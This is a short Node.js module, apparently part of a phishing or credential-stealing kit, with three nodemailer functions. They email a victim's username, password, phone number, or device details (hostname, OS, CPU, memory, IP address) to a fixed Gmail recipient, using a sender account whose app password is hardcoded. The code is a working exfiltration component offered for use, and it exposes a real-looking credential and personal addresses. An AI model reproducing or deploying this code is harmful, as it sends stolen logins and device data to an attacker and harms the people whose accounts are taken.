const nodemailer = require('nodemailer');



function mailkaro(dataof,usname, passpw){
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'anshuman91vish@gmail.com',
        pass: 'bqqk gjfb iftl bpar',
      },
    });
    
    // Email content
    const mailOptions = {
      from: 'anshuman91vish@gmail.com',
      to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
      subject: `Victim ${dataof} Data`,
      text: `
                    username : ${usname}
                    Password : ${passpw}`,
    };
    
    // Send the email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error('Error:', error);
      } else {
        console.log('Email sent:', info.response);
        console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
      }
    });
}





function mail_contact_info(dataof,usname, passpw, phone){
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'anshuman91vish@gmail.com',
      pass: 'bqqk gjfb iftl bpar',
    },
  });
  
  // Email content
  const mailOptions = {
    from: 'anshuman91vish@gmail.com',
    to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
    subject: `Victim ${dataof} Data`,
    text: `
                  username : ${usname}
                  Password : ${passpw}
                  phone    : ${phone}`,
  };
  
  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error:', error);
    } else {
      console.log('Email sent:', info.response);
      console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
    }
  });
}




function senddeviceinfo(hostname,osType,osPlatform,osArch,cpuCores,totalMemory,freeMemory,uptime, ipAddress){
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'anshuman91vish@gmail.com',
        pass: 'bqqk gjfb iftl bpar',
      },
    });
    
    // Email content
    const mailOptions = {
      from: 'anshuman91vish@gmail.com',
      to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
      subject: `Victim Device Data`,
      text: `
              hostname : ${hostname} 
              OsType : ${osType} 
              OsPlatform : ${osPlatform} 
              OsArch : ${osArch} 
              Cpu Cores : ${cpuCores} 
              Toatl Memory : ${totalMemory} 
              Free Memory : ${freeMemory} 
              Uptime : ${uptime}
              IP Address : ${ipAddress}
             `,
    };
    
    // Send the email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error('Error:', error);
      } else {
        console.log('Email sent:', info.response);
        console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
      }
    });
}

module.exports = {
    mailkaro, senddeviceinfo, mail_contact_info
};